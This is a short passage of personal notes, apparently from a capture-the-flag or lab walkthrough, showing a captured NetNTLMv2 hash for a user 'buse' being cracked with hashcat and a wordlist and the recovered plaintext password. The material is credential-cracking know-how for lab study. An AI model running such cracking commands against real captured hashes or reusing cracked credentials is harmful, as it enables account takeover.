#Attacking_Machine 
- Copy the hash from the previous step to a file.
```
echo "buse::WINDCORP:abbd718d4ffb355f:D4F29FD7250BD6F895CE4BC5028E1D24:" > busehash.txt
```

- Run *hashcat* to decode it.

```
hashcat -m 5600 busehash.txt /usr/share/wordlists/rockyou.txt -o buse_cracked.txt --force 
```

![[Cracking the hash-20250429122403411.webp]]

]

> [!Success] Hash cracked
> uyab_cakep
